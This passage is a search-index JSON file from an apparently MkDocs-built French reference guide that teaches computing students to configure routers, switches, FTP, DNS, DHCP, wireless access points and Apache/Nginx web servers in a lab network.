{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Guide de Configuration R\u00e9seau R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 Configuration pratique des composants r\u00e9seau essentiels Table des Mati\u00e8res # Sujet Protocole / Couche 01 Routeur Couche 3 \u2014 Routage IP 02 Commutateur r\u00e9seau Couche 2 \u2014 MAC / VLANs 03 Serveur FTP TCP Port 21 04 Serveur DNS UDP/TCP Port 53 05 Serveur DHCP UDP Port 67/68 06 Point d'Acc\u00e8s Sans Fil IEEE 802.11 07 Serveur Web (Apache / Nginx) TCP Port 80 / 443 01 \u2014 Routeur \u00c9quipement de couche 3 qui achemine les paquets entre diff\u00e9rents r\u00e9seaux en utilisant l'adressage IP et les tables de routage. Qu'est-ce qu'un Routeur ? Un routeur fonctionne \u00e0 la couche 3 (couche R\u00e9seau) du mod\u00e8le OSI. Son r\u00f4le principal est de transf\u00e9rer les paquets de donn\u00e9es entre diff\u00e9rents r\u00e9seaux \u2014 g\u00e9n\u00e9ralement entre votre r\u00e9seau local (LAN) et Internet (WAN). Il utilise une table de routage pour d\u00e9terminer le meilleur chemin pour chaque paquet. Concept cl\u00e9 : Les routeurs s\u00e9parent les domaines de diffusion. Chaque interface d'un routeur repr\u00e9sente un segment r\u00e9seau distinct. Sch\u00e9ma R\u00e9seau [Internet / FAI] \u2502 \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510 \u2502ROUTEUR\u2502 \u2190 192.168.1.1 (passerelle) \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518 \u2502 LAN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \u2502 \u2502 [PC1] [PC2] [Serveur] .10 .20 .100 Configuration \u2014 Cisco IOS \u00c9tape 1 \u2014 Connexion via Console Utilisez un c\u00e2ble console (rollover) entre votre PC et le port console du routeur. Ouvrez un \u00e9mulateur de terminal (PuTTY, SecureCRT) \u00e0 9600 bauds, 8N1 . \u00c9tape 2 \u2014 Passer en Mode Privil\u00e9gi\u00e9 Router> enable Router# configure terminal \u00c9tape 3 \u2014 D\u00e9finir le Nom d'H\u00f4te et le Mot de Passe Router(config)# hostname MonRouteur MonRouteur(config)# enable secret MotDePasseFort123 MonRouteur(config)# service password-encryption \u00c9tape 4 \u2014 Configurer l'Interface LAN MonRouteur(config)# interface GigabitEthernet0/0 MonRouteur(config-if)# ip address 192.168.1.1 255.255.255.0 MonRouteur(config-if)# no shutdown MonRouteur(config-if)# description Interface LAN \u00c9tape 5 \u2014 Configurer l'Interface WAN et la Route par D\u00e9faut MonRouteur(config)# interface GigabitEthernet0/1 MonRouteur(config-if)# ip address dhcp MonRouteur(config-if)# no shutdown MonRouteur(config)# ip route 0.0.0.0 0.0.0.0 GigabitEthernet0/1 \u00c9tape 6 \u2014 Sauvegarder la Configuration MonRouteur# copy running-config startup-config Termes cl\u00e9s : Table de routage \u00b7 NAT \u00b7 WAN \u00b7 Passerelle par d\u00e9faut \u00b7 Cisco IOS 02 \u2014 Commutateur R\u00e9seau \u00c9quipement de couche 2 qui interconnecte les appareils d'un m\u00eame r\u00e9seau gr\u00e2ce \u00e0 l'apprentissage des adresses MAC et \u00e0 la segmentation optionnelle en VLANs. Qu'est-ce qu'un Commutateur ? Un commutateur fonctionne \u00e0 la couche 2 (couche Liaison de donn\u00e9es) . Il apprend les adresses MAC et transmet les trames uniquement vers le port destinataire \u2014 contrairement \u00e0 un hub qui diffuse vers tous les ports. Les commutateurs administrables modernes supportent les VLANs, STP, QoS et la mise en miroir de ports. Type Configuration Cas d'utilisation Non administrable Aucune Petits r\u00e9seaux domestiques/bureaux Administrable Requise (CLI ou interface web) Entreprise, VLANs, supervision Architecture VLAN Commutateur (24 ports) \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 VLAN 10 \u2014 Ports 1\u20138 \u2502 \u2190 Personnel \u2502 VLAN 20 \u2014 Ports 9\u201316 \u2502 \u2190 \u00c9tudiants \u2502 VLAN 99 \u2014 Port 24 \u2502 \u2190 Gestion \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Port trunk \u2192 Routeur (marquage 802.1Q) Configuration \u2014 Commutateur Administrable Cisco \u00c9tape 1 \u2014 Cr\u00e9er les VLANs Switch(config)# vlan 10 Switch(config-vlan)# name PERSONNEL Switch(config)# vlan 20 Switch(config-vlan)# name ETUDIANTS \u00c9tape 2 \u2014 Affecter les Ports d'Acc\u00e8s aux VLANs Switch(config)# interface range Fa0/1 - 8 Switch(config-if-range)# switchport mode access Switch(config-if-range)# switchport access vlan 10 \u00c9tape 3 \u2014 Configurer le Port Trunk (vers le Routeur) Switch(config)# interface Fa0/24 Switch(config-if)# switchport mode trunk Switch(config-if)# switchport trunk allowed vlan 10,20,99 \u00c9tape 4 \u2014 D\u00e9finir l'Adresse IP de Gestion Switch(config)# interface vlan 99 Switch(config-if)# ip address 192.168.99.2 255.255.255.0 Switch(config-if)# no shutdown Remarque : Configurez toujours un VLAN de gestion distinct des VLANs utilisateurs pour l'acc\u00e8s distant via SSH ou l'interface web. Termes cl\u00e9s : VLAN \u00b7 Trunk 802.1Q \u00b7 STP \u00b7 Table MAC \u00b7 Port d'acc\u00e8s 03 \u2014 Serveur FTP File Transfer Protocol \u2014 permet le transfert de fichiers sur un r\u00e9seau via vsftpd sous Linux. Fonctionnement du FTP Le FTP utilise deux canaux distincts : Canal de contr\u00f4le (port 21) \u2014 pour l'authentification et les commandes Canal de donn\u00e9es (port 20 actif / port n\u00e9goci\u00e9 passif) \u2014 pour le transfert effectif des fichiers Mode Connexion de donn\u00e9es NAT/Pare-feu Actif Serveur \u2192 Client (port 20) \u274c \u00c9choue avec le NAT Passif Client \u2192 Serveur (port \u00e9lev\u00e9) \u2705 Fonctionne avec le NAT \u26a0\ufe0f Avertissement de s\u00e9curit\u00e9 : Le FTP standard transmet les identifiants en texte clair . En production, utilisez SFTP (port 22, via SSH) ou FTPS (FTP sur TLS). R\u00e9servez le FTP classique aux r\u00e9seaux de laboratoire isol\u00e9s. Configuration \u2014 vsftpd sur Ubuntu \u00c9tape 1 \u2014 Installer vsftpd sudo apt update && sudo apt install vsftpd -y sudo systemctl enable vsftpd \u00c9tape 2 \u2014 Modifier le Fichier de Configuration sudo nano /etc/vsftpd.conf Ajoutez ou d\u00e9commentez les lignes suivantes : # Autoriser les utilisateurs locaux \u00e0 \u00e9crire des fichiers write_enable=YES # Confiner les utilisateurs dans leur r\u00e9pertoire personnel chroot_local_user=YES allow_writeable_chroot=YES # Activer le mode passif pour la compatibilit\u00e9 NAT pasv_enable=YES pasv_min_port=40000 pasv_max_port=40100 \u00c9tape 3 \u2014 Cr\u00e9er un Utilisateur FTP et son R\u00e9pertoire sudo adduser utilisateurftp sudo mkdir -p /home/utilisateurftp/fichiers sudo chown nobody:nogroup /home/utilisateurftp sudo chown utilisateurftp:utilisateurftp /home/utilisateurftp/fichiers \u00c9tape 4 \u2014 Ouvrir les Ports du Pare-feu et Red\u00e9marrer sudo ufw allow 21/tcp sudo ufw allow 40000:40100/tcp sudo systemctl restart vsftpd \u00c9tape 5 \u2014 Tester la Connexion ftp 192.168.1.20 # ou utiliser FileZilla avec le mode passif activ\u00e9 Termes cl\u00e9s : vsftpd \u00b7 Port 21 \u00b7 Mode passif \u00b7 chroot \u00b7 SFTP 04 \u2014 Serveur DNS Domain Name System \u2014 r\u00e9sout les noms d'h\u00f4tes en adresses IP via BIND9 sous Linux. Fonctionnement de la R\u00e9solution DNS Le navigateur demande : \"quelle est l'IP de webserver.lab.local ?\" \u2502 \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2510 \u2502R\u00e9solveur \u2502 \u2192 v\u00e9rifie le cache local d'abord \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 absence dans le cache \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 BIND9 DNS \u2502 192.168.1.53 \u2502 (autoritaire) \u2502 \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 correspondance trouv\u00e9e dans le fichier de zone \u25bc Retourne : 192.168.1.10 \u2713 Types d'Enregistrements DNS Courants Enregistrement R\u00f4le Exemple A Nom d'h\u00f4te \u2192 IPv4 webserver \u2192 192.168.1.10 AAAA Nom d'h\u00f4te \u2192 IPv6 webserver \u2192 ::1 CNAME Alias vers un autre nom d'h\u00f4te www \u2192 webserver MX Serveur de messagerie du domaine @ \u2192 mail.lab.local PTR R\u00e9solution inverse (IP \u2192 nom) 10 \u2192 webserver.lab.local NS Serveur de noms autoritaire @ \u2192 ns1.lab.local SOA Enregistrement d'autorit\u00e9 de zone D\u00e9but du fichier de zone Configuration \u2014 BIND9 sur Ubuntu \u00c9tape 1 \u2014 Installer BIND9 sudo apt install bind9 bind9utils bind9-doc -y \u00c9tape 2 \u2014 D\u00e9clarer la Zone \u00c9ditez /etc/bind/named.conf.local : zone \"lab.local\" { type master; file \"/etc/bind/zones/db.lab.local\"; }; \u00c9tape 3 \u2014 Cr\u00e9er le Fichier de Zone sudo mkdir -p /etc/bind/zones sudo nano /etc/bind/zones/db.lab.local $TTL 604800 @ IN SOA ns1.lab.local. admin.lab.local. ( 2025010101 ; Num\u00e9ro de s\u00e9rie \u2190 \u00e0 incr\u00e9menter apr\u00e8s chaque modification 604800 ; Rafra\u00eechissement 86400 ; Nouvelle tentative 2419200 ; Expiration 604800 ) ; TTL minimum ; Enregistrement du serveur de noms @ IN NS ns1.lab.local. ns1 IN A 192.168.1.53 ; Enregistrements A des h\u00f4tes router IN A 192.168.1.1 webserver IN A 192.168.1.10 fileserver IN A 192.168.1.20 ; Alias CNAME www IN CNAME webserver \u00c9tape 4 \u2014 Valider et Red\u00e9marrer sudo named-checkconf sudo named-checkzone lab.local /etc/bind/zones/db.lab.local sudo systemctl restart bind9 \u00c9tape 5 \u2014 Tester la R\u00e9solution nslookup webserver.lab.local 192.168.1.53 dig @192.168.1.53 www.lab.local Conseil : Incr\u00e9mentez toujours le num\u00e9ro de s\u00e9rie apr\u00e8s avoir modifi\u00e9 un fichier de zone, sinon les serveurs DNS secondaires ne prendront pas en compte vos changements. Termes cl\u00e9s : BIND9 \u00b7 Fichier de zone \u00b7 Enregistrement A \u00b7 SOA \u00b7 Port 53 \u00b7 nslookup 05 \u2014 Serveur DHCP Dynamic Host Configuration Protocol \u2014 attribue automatiquement des adresses IP et la configuration r\u00e9seau aux clients via isc-dhcp-server . Le Processus DORA Client Serveur DHCP \u2502 \u2502 \u251c\u2500\u2500\u2500\u2500 DISCOVER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 \"Y a-t-il un serveur ? J'ai besoin d'une IP.\" \u2502\u25c0\u2500\u2500\u2500 OFFER \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \"Je vous propose 192.168.1.105\" \u251c\u2500\u2500\u2500\u2500 REQUEST \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 \"J'accepte 192.168.1.105, merci.\" \u2502\u25c0\u2500\u2500\u2500 ACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \"Confirm\u00e9 \u2014 bail valide 24h.\" \u2502 \u2502 Ce que le DHCP Attribue Adresse IP \u2014 depuis une plage d\u00e9finie (pool) Masque de sous-r\u00e9seau \u2014 pour le segment r\u00e9seau Passerelle par d\u00e9faut \u2014 l'adresse IP du routeur Serveur(s) DNS \u2014 pour la r\u00e9solution de noms Dur\u00e9e du bail \u2014 d\u00e9lai avant renouvellement Configuration \u2014 isc-dhcp-server sur Ubuntu \u00c9tape 1 \u2014 Installer le Paquet sudo apt install isc-dhcp-server -y \u00c9tape 2 \u2014 D\u00e9finir l'Interface d'\u00c9coute \u00c9ditez /etc/default/isc-dhcp-server : INTERFACESv4=\"eth0\" \u00c9tape 3 \u2014 Configurer le Sous-r\u00e9seau et la Plage d'Adresses \u00c9ditez /etc/dhcp/dhcpd.conf : default-lease-time 86400; # 24 heures max-lease-time 172800; # 48 heures maximum subnet 192.168.1.0 netmask 255.255.255.0 { range 192.168.1.100 192.168.1.200; # plage d'adresses IP option routers 192.168.1.1; # passerelle par d\u00e9faut option domain-name-servers 192.168.1.53, 8.8.8.8; option domain-name \"lab.local\"; } # R\u00e9servation statique par adresse MAC (ex. pour une imprimante) host imprimante { hardware ethernet AA:BB:CC:DD:EE:FF; fixed-address 192.168.1.50; } \u00c9tape 4 \u2014 D\u00e9marrer et Surveiller sudo systemctl restart isc-dhcp-server sudo systemctl status isc-dhcp-server # Afficher les baux actifs cat /var/lib/dhcp/dhcpd.leases Conseil pratique : Utilisez les r\u00e9servations statiques (liaison IP + MAC) pour les serveurs et imprimantes afin qu'ils re\u00e7oivent toujours la m\u00eame adresse IP sans configuration statique manuelle sur l'\u00e9quipement. Termes cl\u00e9s : DORA \u00b7 Bail \u00b7 Plage IP \u00b7 R\u00e9servation \u00b7 Port 67/68 06 \u2014 Point d'Acc\u00e8s Sans Fil \u00c9quipement IEEE 802.11 qui \u00e9tend un r\u00e9seau filaire aux clients sans fil sans assurer de routage. PAP vs Autres \u00c9quipements \u00c9quipement Routage Wi-Fi Cas d'utilisation PAP (WAP) \u274c \u2705 \u00c9tend un LAN filaire existant Routeur sans fil \u2705 \u2705 Appareil tout-en-un pour la maison R\u00e9p\u00e9teur/Amplificateur \u274c \u2705 Rediffuse le signal existant (ajoute de la latence) N\u0153ud Mesh \u274c \u2705 Itin\u00e9rance transparente sur de grandes surfaces Comparatif des Normes 802.11 Norme Nom Wi-Fi D\u00e9bit max Fr\u00e9quence 802.11n Wi-Fi 4 600 Mbps 2,4 / 5 GHz 802.11ac Wi-Fi 5 3,5 Gbps 5 GHz 802.11ax Wi-Fi 6 9,6 Gbps 2,4 / 5 / 6 GHz 802.11be Wi-Fi 7 46 Gbps Multi-bande S\u00e9curit\u00e9 minimale : Utilisez toujours WPA2-Personal ou sup\u00e9rieur. Pr\u00e9f\u00e9rez WPA3 si disponible. N'utilisez jamais WEP ni les r\u00e9seaux ouverts. Configuration \u2014 Interface Web G\u00e9n\u00e9rique (Ubiquiti / Cisco / TP-Link) \u00c9tape 1 \u2014 Connexion Physique Branchez le PAP sur un port de commutateur PoE (ou utilisez un injecteur PoE). Un seul c\u00e2ble Cat5e/Cat6 fournit \u00e0 la fois l'alimentation et les donn\u00e9es. V\u00e9rifiez que le port est bien affect\u00e9 au bon VLAN. \u00c9tape 2 \u2014 Acc\u00e9der \u00e0 l'Interface d'Administration # Acc\u00e8s par d\u00e9faut selon la marque : Ubiquiti UniFi \u2192 Adoption via l'application UniFi Controller Cisco WAP \u2192 https://192.168.1.1 (voir l'\u00e9tiquette) TP-Link EAP \u2192 https://192.168.0.254 Identifiants par d\u00e9faut : admin / admin \u26a0 \u00c0 modifier imm\u00e9diatement apr\u00e8s la premi\u00e8re connexion ! \u00c9tape 3 \u2014 Cr\u00e9er le R\u00e9seau Sans Fil (SSID) Nom SSID : ReseauLabo_5G Bande : 5 GHz (ou double bande) S\u00e9curit\u00e9 : WPA2-Personal (WPA3 si disponible) Mot de passe : [minimum 12 caract\u00e8res, mixte] Tag VLAN : 20 (optionnel, pour la segmentation r\u00e9seau) \u00c9tape 4 \u2014 Configurer le Canal et la Puissance d'\u00c9mission 2,4 GHz \u2192 Utiliser les canaux 1, 6 ou 11 (sans chevauchement) 5 GHz \u2192 Activer le Canal Auto (les canaux DFS sont acceptables) Largeur de canal : 40 MHz (2,4 GHz) / 80 MHz (5 GHz) Puissance TX : Auto ou Moyen \u2190 \u00e9viter le Maximum dans les environnements denses \u00c9tape 5 \u2014 Activer le R\u00e9seau Invit\u00e9 (Optionnel) Cr\u00e9ez un second SSID associ\u00e9 \u00e0 un VLAN isol\u00e9. Activez l'isolation des clients pour emp\u00eacher les invit\u00e9s de communiquer entre eux ou d'acc\u00e9der au LAN principal. Routez le trafic invit\u00e9 vers un sous-r\u00e9seau distinct avec acc\u00e8s Internet uniquement. Termes cl\u00e9s : SSID \u00b7 WPA3 \u00b7 PoE \u00b7 Canal \u00b7 VLAN \u00b7 Isolation des clients 07 \u2014 Serveur Web (Apache / Nginx) Serveur HTTP/HTTPS qui sert du contenu web aux navigateurs, configur\u00e9 via Apache2 ou Nginx sous Linux. Apache vs Nginx Fonctionnalit\u00e9 Apache Nginx Architecture Bas\u00e9e sur les processus \u00c9v\u00e9nementielle (asynchrone) Configuration Par r\u00e9pertoire .htaccess Configuration centralis\u00e9e Support PHP Natif (mod_php) Via PHP-FPM Performances Bon pour le contenu dynamique Excellent pour les fichiers statiques et la forte charge Proxy inverse Support\u00e9 Excellent Id\u00e9al pour H\u00e9bergement mutualis\u00e9, apps PHP Sites \u00e0 fort trafic, microservices Concept d'H\u00f4te Virtuel Requ\u00eate entrante : GET http://site-a.lab.local \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Serveur Web \u2502 \u2502 \u2502 \u2502 VHost: site-a.lab.local \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-a \u2502 \u2502 VHost: site-b.lab.local \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 /var/www/site-b \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Une seule adresse IP \u2192 Plusieurs sites web Configuration \u2014 Apache2 sur Ubuntu \u00c9tape 1 \u2014 Installer Apache2 sudo apt install apache2 -y sudo systemctl enable apache2 # V\u00e9rification : ouvrir http://192.168.1.10 \u2192 page par d\u00e9faut d'Apache \u00c9tape 2 \u2014 Cr\u00e9er un Fichier d'H\u00f4te Virtuel sudo nano /etc/apache2/sites-available/site-a.conf <VirtualHost *:80> ServerName site-a.lab.local DocumentRoot /var/www/site-a ErrorLog ${APACHE_LOG_DIR}/site-a-error.log CustomLog ${APACHE_LOG_DIR}/site-a-access.log combined </VirtualHost> \u00c9tape 3 \u2014 Cr\u00e9er la Racine Web et Activer le Site sudo mkdir -p /var/www/site-a echo \"<h1>Le Site A fonctionne !</h1>\" | sudo tee /var/www/site-a/index.html sudo a2ensite site-a.conf sudo systemctl reload apache2 \u00c9tape 4 \u2014 Activer HTTPS # Option A \u2014 Certificat auto-sign\u00e9 (pour labs/usage interne) : sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\ -keyout /etc/ssl/private/lab.key \\ -out /etc/ssl/certs/lab.crt sudo a2enmod ssl # Puis ajouter les directives SSL dans le VirtualHost sur le port 443 # Option B \u2014 Let's Encrypt (pour les serveurs publics) : sudo apt install certbot python3-certbot-apache sudo certbot --apache Configuration \u2014 Nginx sur Ubuntu \u00c9tape 1 \u2014 Installer Nginx sudo apt install nginx -y sudo systemctl enable nginx \u00c9tape 2 \u2014 Cr\u00e9er un Bloc Serveur sudo nano /etc/nginx/sites-available/site-a server { listen 80; server_name site-a.lab.local; root /var/www/site-a; index index.html; access_log /var/log/nginx/site-a-access.log; error_log /var/log/nginx/site-a-error.log; } \u00c9tape 3 \u2014 Activer le Site et Recharger sudo ln -s /etc/nginx/sites-available/site-a /etc/nginx/sites-enabled/ sudo nginx -t # tester la syntaxe de la configuration sudo systemctl reload nginx Termes cl\u00e9s : H\u00f4te virtuel \u00b7 DocumentRoot \u00b7 TLS/SSL \u00b7 Let's Encrypt \u00b7 Port 80/443 \u00b7 Certbot R\u00e9f\u00e9rence Rapide \u2014 Ports et Protocoles Service Protocole Port(s) Remarques Contr\u00f4le FTP TCP 21 Authentification et commandes Donn\u00e9es FTP (Actif) TCP 20 Connexion initi\u00e9e par le serveur Donn\u00e9es FTP (Passif) TCP 40000\u201340100 Connexion initi\u00e9e par le client ; compatible NAT SSH / SFTP TCP 22 Alternative chiffr\u00e9e au FTP DNS UDP / TCP 53 UDP pour les requ\u00eates, TCP pour les transferts de zone Serveur DHCP UDP 67 Le serveur \u00e9coute Client DHCP UDP 68 Le client \u00e9coute HTTP TCP 80 Trafic web non chiffr\u00e9 HTTPS TCP 443 Trafic web chiffr\u00e9 via TLS Commandes de Diagnostic Utiles # Tester la r\u00e9solution DNS nslookup webserver.lab.local 192.168.1.53 dig @192.168.1.53 site-a.lab.local # V\u00e9rifier les ports ouverts sur un serveur ss -tulnp netstat -tulnp # Tester la r\u00e9ponse HTTP curl -I http://site-a.lab.local # Afficher les baux DHCP cat /var/lib/dhcp/dhcpd.leases # V\u00e9rifier l'\u00e9tat d'un service (remplacer par le service souhait\u00e9) sudo systemctl status bind9 sudo systemctl status apache2 # Consulter les journaux en temps r\u00e9el sudo tail -f /var/log/apache2/site-a-access.log sudo journalctl -u nginx -f # Ping / traceroute ping 192.168.1.1 traceroute 8.8.8.8 Guide de Configuration R\u00e9seau \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 2025","title":"Home"},{"location":"#guide-de-configuration-reseau","text":"R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u2014 Configuration pratique des composants r\u00e9seau essentiels","title":"Guide de Configuration R\u00e9seau"},{"location":"#table-des-matieres","text":"# Sujet Protocole / Couche 01 Routeur Couche 3 \u2014 Routage IP 02 Commutateur r\u00e9seau Couche 2 \u2014 MAC / VLANs 03 Serveur FTP TCP Port 21 04 Serveur DNS UDP/TCP Port 53 05 Serveur DHCP UDP Port 67/68 06 Point d'Acc\u00e8s Sans Fil IEEE 802.11 07 Serveur Web (Apache / Nginx) TCP Port 80 / 443","title":"Table des Mati\u00e8res"},{"location":"#01-routeur","text":"\u00c9quipement de couche 3 qui achemine les paquets entre diff\u00e9rents r\u00e9seaux en utilisant l'adressage IP et les tables de routage.","title":"01 \u2014 Routeur"},{"location":"#quest-ce-quun-routeur","text":"Un routeur fonctionne \u00e0 la couche 3 (couche R\u00e9seau) du mod\u00e8le OSI. Son r\u00f4le principal est de transf\u00e9rer les paquets de donn\u00e9es entre diff\u00e9rents r\u00e9seaux \u2014 g\u00e9n\u00e9ralement entre votre r\u00e9seau local (LAN) et Internet (WAN). Il utilise une table de routage pour d\u00e9terminer le meilleur chemin pour chaque paquet. Concept cl\u00e9 : Les routeurs s\u00e9parent les domaines de diffusion. Chaque interface d'un routeur repr\u00e9sente un segment r\u00e9seau distinct.","title":"Qu'est-ce qu'un Routeur ?"},{"location":"#schema-reseau","text":"[Internet / FAI] \u2502 \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510 \u2502ROUTEUR\u2502 \u2190 192.168.1.1 (passerelle) \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518 \u2502 LAN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \u2502 \u2502 [PC1] [PC2] [Serveur] .10 .20 .100","title":"Sch\u00e9ma R\u00e9seau"},{"location":"#configuration-cisco-ios","text":"\u00c9tape 1 \u2014 Connexion via Console Utilisez un c\u00e2ble console (rollover) entre votre PC et le port console du routeur. Ouvrez un \u00e9mulateur de terminal (PuTTY, SecureCRT) \u00e0 9600 bauds, 8N1 . \u00c9tape 2 \u2014 Passer en Mode Privil\u00e9gi\u00e9 Router> enable Router# configure terminal \u00c9tape 3 \u2014 D\u00e9finir le Nom d'H\u00f4te et le Mot de Passe Router(config)# hostname MonRouteur MonRouteur(config)# enable secret MotDePasseFort123 MonRouteur(config)# service password-encryption \u00c9tape 4 \u2014 Configurer l'Interface LAN MonRouteur(config)# interface GigabitEthernet0/0 MonRouteur(config-if)# ip address 192.168.1.1 255.255.255.0 MonRouteur(config-if)# no shutdown MonRouteur(config-if)# description Interface LAN \u00c9tape 5 \u2014 Configurer l'Interface WAN et la Route par D\u00e9faut MonRouteur(config)# interface GigabitEthernet0/1 MonRouteur(config-if)# ip address dhcp MonRouteur(config-if)# no shutdown MonRouteur(config)# ip route 0.0.0.0 0.0.0.0 GigabitEthernet0/1 \u00c9tape 6 \u2014 Sauvegarder la Configuration MonRouteur# copy running-config startup-config Termes cl\u00e9s : Table de routage \u00b7 NAT \u00b7 WAN \u00b7 Passerelle par d\u00e9faut \u00b7 Cisco IOS","title":"Configuration \u2014 Cisco IOS"},{"location":"#02-commutateur-reseau","text":"\u00c9quipement de couche 2 qui interconnecte les appareils d'un m\u00eame r\u00e9seau gr\u00e2ce \u00e0 l'apprentissage des adresses MAC et \u00e0 la segmentation optionnelle en VLANs.","title":"02 \u2014 Commutateur R\u00e9seau"},{"location":"#quest-ce-quun-commutateur","text":"Un commutateur fonctionne \u00e0 la couche 2 (couche Liaison de donn\u00e9es) . Il apprend les adresses MAC et transmet les trames uniquement vers le port destinataire \u2014 contrairement \u00e0 un hub qui diffuse vers tous les ports. Les commutateurs administrables modernes supportent les VLANs, STP, QoS et la mise en miroir de ports. Type Configuration Cas d'utilisation Non administrable Aucune Petits r\u00e9seaux domestiques/bureaux Administrable Requise (CLI ou interface web) Entreprise, VLANs, supervision","title":"Qu'est-ce qu'un Commutateur ?"},{"location":"#architecture-vlan","text":"Commutateur (24 ports) \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 VLAN 10 \u2014 Ports 1\u20138 \u2502 \u2190 Personnel \u2502 VLAN 20 \u2014 Ports 9\u201316 \u2502 \u2190 \u00c9tudiants \u2502 VLAN 99 \u2014 Port 24 \u2502 \u2190 Gestion \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Port trunk \u2192 Routeur (marquage 802.1Q)","title":"Architecture VLAN"},{"location":"#configuration-commutateur-administrable-cisco","text":"\u00c9tape 1 \u2014 Cr\u00e9er les VLANs Switch(config)# vlan 10 Switch(config-vlan)# name PERSONNEL Switch(config)# vlan 20 Switch(config-vlan)# name ETUDIANTS \u00c9tape 2 \u2014 Affecter les Ports d'Acc\u00e8s aux VLANs Switch(config)# interface range Fa0/1 - 8 Switch(config-if-range)# switchport mode access Switch(config-if-range)# switchport access vlan 10 \u00c9tape 3 \u2014 Configurer le Port Trunk (vers le Routeur) Switch(config)# interface Fa0/24 Switch(config-if)# switchport mode trunk Switch(config-if)# switchport trunk allowed vlan 10,20,99 \u00c9tape 4 \u2014 D\u00e9finir l'Adresse IP de Gestion Switch(config)# interface vlan 99 Switch(config-if)# ip address 192.168.99.2 255.255.255.0 Switch(config-if)# no shutdown Remarque : Configurez toujours un VLAN de gestion distinct des VLANs utilisateurs pour l'acc\u00e8s distant via SSH ou l'interface web. Termes cl\u00e9s : VLAN \u00b7 Trunk 802.1Q \u00b7 STP \u00b7 Table MAC \u00b7 Port d'acc\u00e8s","title":"Configuration \u2014 Commutateur Administrable Cisco"},{"location":"#03-serveur-ftp","text":"File Transfer Protocol \u2014 permet le transfert de fichiers sur un r\u00e9seau via vsftpd sous Linux.","title":"03 \u2014 Serveur FTP"},{"location":"#fonctionnement-du-ftp","text":"Le FTP utilise deux canaux distincts : Canal de contr\u00f4le (port 21) \u2014 pour l'authentification et les commandes Canal de donn\u00e9es (port 20 actif / port n\u00e9goci\u00e9 passif) \u2014 pour le transfert effectif des fichiers Mode Connexion de donn\u00e9es NAT/Pare-feu Actif Serveur \u2192 Client (port 20) \u274c \u00c9choue avec le NAT Passif Client \u2192 Serveur (port \u00e9lev\u00e9) \u2705 Fonctionne avec le NAT \u26a0\ufe0f Avertissement de s\u00e9curit\u00e9 : Le FTP standard transmet les identifiants en texte clair . En production, utilisez SFTP (port 22, via SSH) ou FTPS (FTP sur TLS). R\u00e9servez le FTP classique aux r\u00e9seaux de laboratoire isol\u00e9s.","title":"Fonctionnement du FTP"},{"location":"#configuration-vsftpd-sur-ubuntu","text":"\u00c9tape 1 \u2014 